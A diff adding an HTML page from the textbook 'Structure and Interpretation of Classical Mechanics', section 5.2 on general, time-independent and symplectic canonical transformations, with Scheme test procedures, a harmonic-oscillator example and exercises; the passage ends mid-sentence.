@@ -1,0 +1,807 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-58.html">previous</a></span><span>, <a href="book-Z-H-60.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_5.2"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_5.2">5.2&nbsp;&nbsp;General Canonical Transformations</a></h2>
+<p><a name="%_idx_2478"></a><a name="%_idx_2480"></a>
+Although we have shown how to extend any point transformation of the
+configuration space to a canonical transformation, there are other
+ways to construct canonical transformations.  How do we know if we
+have a canonical transformation?  To test if a transformation is
+canonical we may use the fact that if the transformation is canonical,
+then Hamilton's equations of motion for the transformed system and
+the original system will be equivalent.</p>
+<p>
+Consider a Hamiltonian <em>H</em> and a phase-space transformation&nbsp;<em>C</em>.
+The transformation <em>C</em> transforms the phase-space path <img src="chap3-Z-G-D-5.gif" border="0">'(<em>t</em>)  = 
+(<em>t</em>, <em>q</em>'(<em>t</em>), <em>p</em>'(<em>t</em>)) into <img src="chap3-Z-G-D-5.gif" border="0">(<em>t</em>)  =  (<em>t</em>, <em>q</em>(<em>t</em>), <em>p</em>(<em>t</em>)):
+<a name="EQUATION_5.12"></a></p>
+<div align=left><img src="chap5-Z-G-13.gif" border="0"></div>
+<p>
+The rates of change of the phase-space coordinates are
+transformed by the derivative of the transformation
+<a name="EQUATION_5.13"></a></p>
+<div align=left><img src="chap5-Z-G-14.gif" border="0"></div>
+<p>
+Let <em>D</em><sub><em>s</em></sub> be the phase-space derivative operator
+<a name="EQUATION_5.14"></a></p>
+<div align=left><img src="chap5-Z-G-15.gif" border="0"></div>
+<p>
+Hamilton's equations are 
+<a name="EQUATION_5.15"></a></p>
+<div align=left><img src="chap5-Z-G-16.gif" border="0"></div>
+<p>
+for any realizable phase-space path <img src="chap3-Z-G-D-5.gif" border="0">.</p>
+<p>
+The transformation is canonical if the equations of motion
+obtained from the new Hamiltonian are the same as those that could be
+obtained by transforming the equations of motion derived from the
+original Hamiltonian to the new coordinates:
+<a name="EQUATION_5.16"></a></p>
+<div align=left><img src="chap5-Z-G-17.gif" border="0"></div>
+<p>
+Comparing equation&nbsp;(<a href="#EQUATION_5.15">5.15</a>) with this, we see
+<a name="EQUATION_5.17"></a></p>
+<div align=left><img src="chap5-Z-G-18.gif" border="0"></div>
+<p>
+Using <img src="chap3-Z-G-D-5.gif" border="0">  =  <em>C</em> <small>o</small> <img src="chap3-Z-G-D-5.gif" border="0">', we find
+<a name="EQUATION_5.18"></a></p>
+<div align=left><img src="chap5-Z-G-19.gif" border="0"></div>
+<p>
+This condition must hold for any realizable phase-space path
+<img src="chap3-Z-G-D-5.gif" border="0">'.  Certainly this is true if the following condition holds
+for every phase-space point:
+<a name="EQUATION_5.19"></a></p>
+<div align=left><img src="chap5-Z-G-20.gif" border="0"></div>
+<p></p>
+<p>
+Any transformation that satisfies
+equation&nbsp;(<a href="#EQUATION_5.19">5.19</a>) is a canonical
+transformation among phase-space representations of a dynamical
+system.  In one phase-space representation the system's dynamics is
+characterized by the Hamiltonian <em>H</em>' and in the other by <em>H</em>.  The
+idea behind this equation is illustrated in
+figure&nbsp;<a href="book-Z-H-1000.html#FIGURE_5.1">5.1</a>.
+<a name="FIGURE_5.1"></a></p>
+<div align=left><img src="chap5-Z-G-21.gif" border="0"></div>
+<p></p>
+<p>
+We can formalize this test as a program:
+</p>
+<p><tt><a name="%_idx_2482"></a>(define&nbsp;(canonical?&nbsp;C&nbsp;H&nbsp;Hprime)<br>
+&nbsp;&nbsp;(-&nbsp;(compose&nbsp;(phase-space-derivative&nbsp;H)&nbsp;C)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;(D&nbsp;C)&nbsp;(phase-space-derivative&nbsp;Hprime))))<br>
+</p>
+</tt>
+<p>where <tt>phase-space-derivative</tt>, which was introduced in
+chapter&nbsp;<a href="book-Z-H-36.html#%_chap_3">3</a>, implements <em>D</em><sub><em>s</em></sub>.
+The transformation is canonical if these residuals are zero.</p>
+<p>
+If a suitable Hamiltonian for the transformed
+system is obtained by composing <em>H</em> with the phase-space
+transformation, we obtain a more specific formula:
+<a name="%_idx_2484"></a><a name="EQUATION_5.20"></a></p>
+<div align=left><img src="chap5-Z-G-22.gif" border="0"></div>
+<p>
+and a more specific test:
+</p>
+<p><tt><a name="%_idx_2486"></a>(define&nbsp;(compositional-canonical?&nbsp;C&nbsp;H)<br>
+&nbsp;&nbsp;(canonical?&nbsp;C&nbsp;H&nbsp;(compose&nbsp;H&nbsp;C)))<br>
+</p>
+</tt>
+<p>
+Using this test, we can verify that the polar-to-rectangular
+transformation satisfies the test for a canonical transformation on a
+general central field:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((compositional-canonical?&nbsp;<br>
+&nbsp;&nbsp;&nbsp;(F-&gt;CT&nbsp;p-&gt;r)<br>
+&nbsp;&nbsp;&nbsp;(H-central&nbsp;'m&nbsp;(literal-function&nbsp;'V)))<br>
+&nbsp;&nbsp;(up&nbsp;'t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'r&nbsp;'phi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'p_r&nbsp;'p_phi))))<br>
+<i>(up&nbsp;0&nbsp;(up&nbsp;0&nbsp;0)&nbsp;(down&nbsp;0&nbsp;0))</i><br>
+</p>
+</tt>
+<p>The residuals are zero so the transformation is canonical.</p>
+<p>
+</p>
+<p><a name="%_thm_5.2"></a>
+<b>Exercise 5.2.</b>&nbsp;&nbsp;<strong>Group properties</strong><br>
+<a name="%_idx_2488"></a><a name="%_idx_2490"></a><a name="%_idx_2492"></a><a name="%_idx_2494"></a>
+If we say that <em>C</em> is canonical with respect to Hamiltonians <em>H</em> and <em>H</em>' if and only if <em>D</em><sub><em>s</em></sub> <em>H</em> <small>o</small> <em>C</em>  =  <em>D</em><em>C</em>  &middot;  <em>D</em><sub><em>s</em></sub> <em>H</em>', then:</p>
+<p>
+<strong>a</strong>.&nbsp;&nbsp;Show that the composition of canonical transformations is canonical.
+
+<strong>b</strong>.&nbsp;&nbsp;Show that composition of canonical transformations is associative.
+
+<strong>c</strong>.&nbsp;&nbsp;Show that the identity transformation is canonical.
+
+<strong>d</strong>.&nbsp;&nbsp;Show that there is an inverse for a canonical transformation
+and the inverse is canonical.
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_5.2.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_5.2.1">5.2.1&nbsp;&nbsp;Time-Independent Canonical Transformations</a></h3>
+<p><a name="%_idx_2496"></a><a name="%_idx_2498"></a>
+We have defined a canonical transformation as a transformation of
+phase-space coordinates for which Hamilton's equations transform
+appropriately.  The conditions that a canonical transformation must
+satisfy (equations <a href="#EQUATION_5.19">5.19</a> or
+<a href="#EQUATION_5.20">5.20</a>) involve the Hamiltonians.  If the Hamiltonians
+transform by composition and the transformation is time independent,
+then we can tell if the phase-space transformation is canonical
+without further reference to the Hamiltonian.</p>
+<p>
+First, we rewrite Hamilton's equations in a slightly different form.
+Hamilton's equations are constructed from the derivative of the
+Hamiltonian by rearranging the components and then negating some of
+them.  We introduce a <a name="%_idx_2500"></a><a name="%_idx_2502"></a><a name="%_idx_2504"></a>shuffle function that does this rearrangement:
+<a name="EQUATION_5.21"></a></p>
+<div align=left><img src="chap5-Z-G-23.gif" border="0"></div>
+<p>
+The argument to <img src="chap5-Z-G-D-1.gif" border="0"> is a down tuple of components of the
+derivative of a Hamiltonian-like function.  The shuffle function is
+linear.  We also introduce a constant function:
+<a name="EQUATION_5.22"></a></p>
+<div align=left><img src="chap5-Z-G-24.gif" border="0"></div>
+<p>
+With these, Hamilton's equations can be expressed as
+<a name="EQUATION_5.23"></a></p>
+<div align=left><img src="chap5-Z-G-25.gif" border="0"></div>
+<p></p>
+<p>
+With <img src="chap5-Z-G-D-1.gif" border="0"> and <img src="chap1-Z-G-D-35.gif" border="0"> the canonical
+condition&nbsp;(<a href="#EQUATION_5.20">5.20</a>) can be rewritten 
+<a name="EQUATION_5.24"></a></p>
+<div align=left><img src="chap5-Z-G-26.gif" border="0"></div>
+<p>
+The value of <img src="chap1-Z-G-D-35.gif" border="0"> does not depend on its arguments, and for
+time-independent transformations <img src="chap1-Z-G-D-35.gif" border="0">  =  <em>D</em><em>C</em>  &middot; 
+<img src="chap1-Z-G-D-35.gif" border="0">, so the canonical condition becomes
+<a name="EQUATION_5.26"></a></p>
+<div align=left><img src="chap5-Z-G-27.gif" border="0"></div>
+<p>
+Applied to a particular phase-space state <em>s</em> this is
+<a name="EQUATION_5.27"></a></p>
+<div align=left><img src="chap5-Z-G-28.gif" border="0"></div>
+<p></p>
+<p>
+Let <img src="chap5-Z-G-D-2.gif" border="0"> be a function that takes a multiplier and produces a
+linear transformation that multiplies the multiplier by the argument
+to the linear transformation:
+<a name="EQUATION_5.28"></a></p>
+<div align=left><img src="chap5-Z-G-29.gif" border="0"></div>
+<p>
+Similarly, let <img src="chap5-Z-G-D-2.gif" border="0"><sup>*</sup> be a function that takes a multiplier and produces a
+linear transformation that multiplies the argument to the linear
+transformation by the multiplier:
+<a name="EQUATION_5.29"></a></p>
+<div align=left><img src="chap5-Z-G-30.gif" border="0"></div>
+<p>
+Using <img src="chap5-Z-G-D-2.gif" border="0"> and <img src="chap5-Z-G-D-2.gif" border="0"><sup>*</sup>, we can rewrite
+condition&nbsp;(<a href="#EQUATION_5.27">5.27</a>) as
+<a name="EQUATION_5.30"></a></p>
+<div align=left><img src="chap5-Z-G-31.gif" border="0"></div>
+<p>
+This condition is satisfied if
+<a name="EQUATION_5.31"></a></p>
+<div align=left><img src="chap5-Z-G-32.gif" border="0"></div>
+<p>
+A time-independent transformation <em>C</em> is canonical, for Hamiltonians
+that transform by composition, if this condition
+on its derivative <em>D</em><em>C</em> is satisfied.  </p>
+<p>
+Note that the condition&nbsp;(<a href="#EQUATION_5.31">5.31</a>)
+does not refer to the Hamiltonian.  This is a remarkable result.
+Though we have assumed the Hamiltonians transform by composition with
+the transformation, we can decide whether a time-independent
+phase-space transformation preserves the dynamics of Hamilton's
+equation without further reference to the details of the dynamical
+system.</p>
+<p>
+
+The test is implemented thus:
+</p>
+<p><tt><a name="%_idx_2506"></a>(define&nbsp;((time-independent-canonical?&nbsp;C)&nbsp;s)<br>
+&nbsp;&nbsp;((-&nbsp;J-func<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(compose&nbsp;(Phi&nbsp;((D&nbsp;C)&nbsp;s))&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;J-func<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Phi*&nbsp;((D&nbsp;C)&nbsp;s))))<br>
+&nbsp;&nbsp;&nbsp;(compatible-shape&nbsp;s)))<br>
+<a name="%_idx_2508"></a>(define&nbsp;(J-func&nbsp;DH)<br>
+&nbsp;&nbsp;(up&nbsp;0&nbsp;(ref&nbsp;DH&nbsp;2)&nbsp;(-&nbsp;(ref&nbsp;DH&nbsp;1))))<br>
+(define&nbsp;((Phi&nbsp;A)&nbsp;v)&nbsp;(*&nbsp;A&nbsp;v))<br>
+<br>
+(define&nbsp;((Phi*&nbsp;A)&nbsp;w)&nbsp;(*&nbsp;w&nbsp;A))<br>
+</p>
+</tt>
+<p>This procedure tests whether a composition of functions is the same
+function as <img src="chap5-Z-G-D-1.gif" border="0"> by computing their difference when applied
+to a general typical argument.<a name="call_footnote_Temp_334" href="#footnote_Temp_334"><sup><small>4</small></sup></a>
+Here they are applied to a
+structure with the shape of <em>D</em><em>H</em>(<em>s</em>), for an arbitrary phase-space
+state <em>s</em>.<a name="call_footnote_Temp_335" href="#footnote_Temp_335"><sup><small>5</small></sup></a></p>
+<p>
+
+<a name="%_idx_2514"></a>For example, consider the following polar-canonical transformation:
+<a name="EQUATION_5.32"></a></p>
+<div align=left><img src="chap5-Z-G-33.gif" border="0"></div>
+<p>
+where
+<a name="EQUATION_5.33"></a></p>
+<div align=left><img src="chap5-Z-G-34.gif" border="0"></div>
+<p>
+Here <img src="chap1-Z-G-D-21.gif" border="0"> is an arbitrary parameter.  We define:
+</p>
+<p><tt><a name="%_idx_2516"></a>(define&nbsp;((polar-canonical&nbsp;alpha)&nbsp;H-state)<br>
+&nbsp;&nbsp;(let&nbsp;((t&nbsp;(time&nbsp;H-state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(theta&nbsp;(coordinate&nbsp;H-state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(I&nbsp;(momentum&nbsp;H-state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((x&nbsp;(*&nbsp;(sqrt&nbsp;(/&nbsp;(*&nbsp;2&nbsp;I)&nbsp;alpha))&nbsp;(sin&nbsp;theta)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(p_x&nbsp;(*&nbsp;(sqrt&nbsp;(*&nbsp;2&nbsp;alpha&nbsp;I))&nbsp;(cos&nbsp;theta))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;t&nbsp;x&nbsp;p_x))))<br>
+</p>
+</tt>
+<p>And now we just run our test:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((time-independent-canonical?&nbsp;(polar-canonical&nbsp;'alpha))<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;'theta&nbsp;'I)))<br>
+<i>(up&nbsp;0&nbsp;0&nbsp;0)</i><br>
+</p>
+</tt>
+<p>So the transformation is canonical.<a name="call_footnote_Temp_336" href="#footnote_Temp_336"><sup><small>6</small></sup></a></p>
+<p>
+Of course, not every transformation we might try is 
+canonical.  For example, we might try <em>x</em>  =  <em>p</em> sin <img src="chap1-Z-G-D-19.gif" border="0"> with <em>p</em><sub><em>x</em></sub>  = 
+<em>p</em> cos <img src="chap1-Z-G-D-19.gif" border="0">.  The implementation is<a name="call_footnote_Temp_337" href="#footnote_Temp_337"><sup><small>7</small></sup></a>
+</p>
+<p><tt>(define&nbsp;(a-non-canonical-transform&nbsp;H-state)<br>
+&nbsp;&nbsp;(let&nbsp;((t&nbsp;(time&nbsp;H-state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(theta&nbsp;(coordinate&nbsp;H-state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(p&nbsp;(momentum&nbsp;H-state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((x&nbsp;(*&nbsp;p&nbsp;(sin&nbsp;theta)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(p_x&nbsp;(*&nbsp;p&nbsp;(cos&nbsp;theta))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;t&nbsp;x&nbsp;p_x))))<br>
+</p>
+</tt>
+<p></p>
+<p><tt>(print-expression<br>
+&nbsp;((time-independent-canonical?&nbsp;a-non-canonical-transform)<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;'theta&nbsp;'p)))<br>
+<i><br>
+(up&nbsp;0&nbsp;(+&nbsp;(*&nbsp;-1&nbsp;p&nbsp;x8102)&nbsp;x8102)&nbsp;(+&nbsp;(*&nbsp;p&nbsp;x8101)&nbsp;(*&nbsp;-1&nbsp;x8101)))</i><br>
+</p>
+</tt>
+<p>So this transformation is not canonical.</p>
+<p>
+</p>
+<a name="%_sec_Temp_338"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_338">Harmonic oscillator</a></h4>
+<p><a name="%_idx_2518"></a><a name="%_idx_2520"></a>
+The analysis of the harmonic oscillator illustrates the use of a
+general canonical transformation in the solution of a problem.  The
+harmonic oscillator is a mathematical model of a simple spring-mass
+system.  The Hamiltonian for a spring-mass system with mass <em>m</em> and
+spring constant <em>k</em> is
+<a name="%_idx_2522"></a><a name="%_idx_2524"></a><a name="EQUATION_5.35"></a></p>
+<div align=left><img src="chap5-Z-G-35.gif" border="0"></div>
+<p>
+<a name="%_idx_2526"></a><a name="%_idx_2528"></a>Hamilton's equations of motion are
+<a name="EQUATION_5.36"></a></p>
+<div align=left><img src="chap5-Z-G-36.gif" border="0"></div>
+<p>
+giving the second-order system
+<a name="EQUATION_5.37"></a></p>
+<div align=left><img src="chap5-Z-G-37.gif" border="0"></div>
+<p>
+<a name="%_idx_2530"></a>The solution is
+<a name="EQUATION_5.38"></a></p>
+<div align=left><img src="chap5-Z-G-38.gif" border="0"></div>
+<p>
+where 
+<a name="EQUATION_5.39"></a></p>
+<div align=left><img src="chap5-Z-G-39.gif" border="0"></div>
+<p>
+and where <em>A</em> and <img src="chap1-Z-G-D-16.gif" border="0"> are determined by initial conditions.</p>
+<p>
+<a name="%_idx_2532"></a>Let's try our polar-canonical transformation <em>C</em><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> on the
+harmonic oscillator.  We substitute expressions&nbsp;(<a href="#EQUATION_5.33">5.33</a>) and
+(<a href="#EQUATION_5.34">5.34</a>) for <em>x</em> and <em>p</em><sub><em>x</em></sub> in the Hamiltonian, getting our new
+Hamiltonian:
+<a name="EQUATION_5.40"></a></p>
+<div align=left><img src="chap5-Z-G-40.gif" border="0"></div>
+<p>
+If we choose <img src="chap1-Z-G-D-21.gif" border="0">  =  (<em>k</em><em>m</em>)<sup>1/2</sup> then we obtain
+<a name="%_idx_2534"></a><a name="%_idx_2536"></a><a name="%_idx_2538"></a><a name="EQUATION_5.41"></a></p>
+<div align=left><img src="chap5-Z-G-41.gif" border="0"></div>
+<p>
+and the new Hamiltonian no longer depends on the coordinate.
+Hamilton's equation for <em>I</em> is
+<a name="EQUATION_5.42"></a></p>
+<div align=left><img src="chap5-Z-G-42.gif" border="0"></div>
+<p>
+so <em>I</em> is constant.  The equation for <img src="chap1-Z-G-D-19.gif" border="0"> is
+<a name="EQUATION_5.43"></a></p>
+<div align=left><img src="chap5-Z-G-43.gif" border="0"></div>
+<p>
+so
+<a name="EQUATION_5.44"></a></p>
+<div align=left><img src="chap5-Z-G-44.gif" border="0"></div>
+<p>
+In the original variables,
+<a name="EQUATION_5.45"></a></p>
+<div align=left><img src="chap5-Z-G-45.gif" border="0"></div>
+<p>
+with the constant <em>A</em>  =  ( 2 <em>I</em>(<em>t</em>)/ <img src="chap1-Z-G-D-21.gif" border="0">)<sup>1/2</sup>.
+So we have found the solution to the problem by making a canonical
+transformation to new phase-space variables for which the solution is
+easy and then transforming the solutions back to the original
+variables.</p>
+<p>
+</p>
+<p><a name="%_thm_5.3"></a>
+<b>Exercise 5.3.</b>&nbsp;&nbsp;<strong>Trouble in Lagrangian world</strong><br></p>
+<p>
+Is there a Lagrangian <em>L</em>' that corresponds to the harmonic oscillator
+Hamiltonian <em>H</em>'(<em>t</em>, <img src="chap1-Z-G-D-19.gif" border="0">, <em>I</em>)  =  <img src="chap1-Z-G-D-23.gif" border="0"> <em>I</em>?  What could this possibly mean?</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.4"></a>
+<b>Exercise 5.4.</b>&nbsp;&nbsp;<strong>Polar-canonical transformations</strong><br></p>
+<p>
+Let <em>x</em>, <em>p</em> and <img src="chap1-Z-G-D-19.gif" border="0">, <em>I</em> be two sets of canonically conjugate variables.
+Consider transformations of the form <em>x</em>  =  <i>&szlig;</i> <em>I</em><sup><img src="chap1-Z-G-D-21.gif" border="0"></sup> sin <img src="chap1-Z-G-D-19.gif" border="0"> and
+<em>p</em>  =  <i>&szlig;</i> <em>I</em><sup><img src="chap1-Z-G-D-21.gif" border="0"></sup> cos <img src="chap1-Z-G-D-19.gif" border="0">.  Determine all <img src="chap1-Z-G-D-21.gif" border="0"> and <i>&szlig;</i>  for
+which this transformation is compositional canonical.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_5.5"></a>
+<b>Exercise 5.5.</b>&nbsp;&nbsp;<strong>Standard map</strong><br>
+</p>
+<p>
+Is the standard map a canonical transformation?  Recall that the standard
+map is: <em>I</em>'  =  <em>I</em>  +  <em>K</em> sin <img src="chap1-Z-G-D-19.gif" border="0">, with <img src="chap1-Z-G-D-19.gif" border="0">'  =  <img src="chap1-Z-G-D-19.gif" border="0">  +  <em>I</em>', both
+modulo 2<img src="chap1-Z-G-D-15.gif" border="0">.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_5.2.2"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_5.2.2">5.2.2&nbsp;&nbsp;Symplectic Transformations</a></h3>
+<p><a name="%_idx_2540"></a>
+Condition&nbsp;(<a href="#EQUATION_5.31">5.31</a>) involves the
+composition of functions, all of which are linear transformations.
+Linear transformations can be represented in terms of matrices.  A 
+matrix representation is defined with respect to a basis.  For
+incremental Hamiltonian states we organize the state components as a
+column matrix of time, the components of the coordinates, and the
+corresponding components of the momenta.</p>
+<p>
+Let <img src="chap5-Z-G-D-3.gif" border="0"> and <strong><em>D</em><em>C</em></strong> be matrix representations
+of <img src="chap5-Z-G-D-1.gif" border="0"> and <img src="chap5-Z-G-D-2.gif" border="0">(<em>D</em><em>C</em>(<em>s</em>)), respectively, where <em>s</em> is
+the arbitrary phase-space state at which the canonical condition is 
+being tested.
+The matrix representation of <img src="chap5-Z-G-D-2.gif" border="0"><sup>*</sup>(<em>D</em><em>C</em>(<em>s</em>)) is the transpose of <strong><em>D</em><em>C</em></strong>.  In terms of these matrix representations, <a name="%_idx_2542"></a>the test for canonical
+becomes
+<a name="EQUATION_5.46"></a></p>
+<div align=left><img src="chap5-Z-G-46.gif" border="0"></div>
+<p>
+<a name="%_idx_2544"></a>We say that a transformation is <em>symplectic</em> if the matrix
+representation of its derivative satisfies this identity.</p>
+<p>
+
+The matrix representation of the multiplier for the linear
+transformation <img src="chap5-Z-G-D-1.gif" border="0"> is <img src="chap5-Z-G-D-3.gif" border="0">.  We can find
+the multiplier for a linear transformation by taking the derivative of
+the linear transformation and evaluating it at an arbitrary point:<a name="call_footnote_Temp_342" href="#footnote_Temp_342"><sup><small>8</small></sup></a>
+<em>D</em><img src="chap5-Z-G-D-1.gif" border="0">( [ <em>a</em>, <em>b</em>, <em>c</em> ] ).  We can obtain a matrix
+representation with the utility <a name="%_idx_2546"></a><tt>s-&gt;m</tt> that takes a structure that represents a multiplier of
+a linear transformation and returns a matrix representation of the
+multiplier.<a name="call_footnote_Temp_343" href="#footnote_Temp_343"><sup><small>9</small></sup></a>
+The matrix <img src="chap5-Z-G-D-3.gif" border="0"> depends only on the number of degrees of
+freedom of the system.  For example, the <img src="chap5-Z-G-D-3.gif" border="0"> for a system with two
+degrees of freedom is
+</p>
+<p><tt>(print-expression<br>
+&nbsp;(let*&nbsp;((s&nbsp;(up&nbsp;'t&nbsp;(up&nbsp;'x&nbsp;'y)&nbsp;(down&nbsp;'px&nbsp;'py)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(s*&nbsp;(compatible-shape&nbsp;s)))<br>
+&nbsp;&nbsp;&nbsp;(s-&gt;m&nbsp;s*&nbsp;((D&nbsp;J-func)&nbsp;s*)&nbsp;s*)))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+<i>(matrix-by-rows&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;1&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;1)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;-1&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;-1&nbsp;0&nbsp;0))</i><br>
+</p>
+</tt>
+<p>
+In terms of matrix representations, the test that a transformation is
+symplectic is
+</p>
+<p><tt><a name="%_idx_2548"></a>(define&nbsp;((symplectic?&nbsp;C)&nbsp;s)<br>
+&nbsp;&nbsp;(let&nbsp;((s*&nbsp;(compatible-shape&nbsp;s)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((J&nbsp;(s-&gt;m&nbsp;s*&nbsp;((D&nbsp;J-func)&nbsp;s*)&nbsp;s*))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(DCs&nbsp;(s-&gt;m&nbsp;s*&nbsp;((D&nbsp;C)&nbsp;s)&nbsp;s)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(-&nbsp;J&nbsp;(*&nbsp;DCs&nbsp;J&nbsp;(m:transpose&nbsp;DCs))))))<br>
+</p>
+</tt>
+<p></p>
+<p>
+For example, we can verify that the point transformation derived from
+the coordinate transformation <tt>p-&gt;r</tt> is symplectic:
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((symplectic?&nbsp;(F-&gt;CT&nbsp;p-&gt;r))<br>
+&nbsp;&nbsp;(up&nbsp;'t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'r&nbsp;'varphi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'p_r&nbsp;'p_varphi))))<br>
+<i>(matrix-by-rows&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;0&nbsp;0&nbsp;0&nbsp;0&nbsp;0))</i><br>
+</p>
+</tt>
+<p>
+
+There is a further simplification available.  The elements of the
+first row and the first column of the matrix representation of
+<img src="chap5-Z-G-D-1.gif" border="0"> are all zeros.  Thus we need to consider only the
+submatrix associated with the coordinates and the momenta.</p>
+<p>
+The <em>q</em><em>p</em> submatrix<a name="call_footnote_Temp_344" href="#footnote_Temp_344"><sup><small>10</small></sup></a>
+of dimension 2<em>n</em>&times; 2<em>n</em> of the matrix <img src="chap5-Z-G-D-3.gif" border="0"> is called
+<a name="%_idx_2550"></a><a name="%_idx_2552"></a><a name="%_idx_2554"></a>the <em>symplectic unit</em> for <em>n</em> degrees of freedom:
+<a name="EQUATION_5.47"></a></p>
+<div align=left><img src="chap5-Z-G-47.gif" border="0"></div>
+<p>
+The matrix <strong><em>J</em></strong><sub><em>n</em></sub> satisfies the
+following identities:
+<a name="EQUATION_5.48"></a></p>
+<div align=left><img src="chap5-Z-G-48.gif" border="0"></div>
+<p>
+A 2<em>n</em>&times; 2<em>n</em> matrix <strong><em>A</em></strong> that satisfies the relation
+<a name="EQUATION_5.49"></a></p>
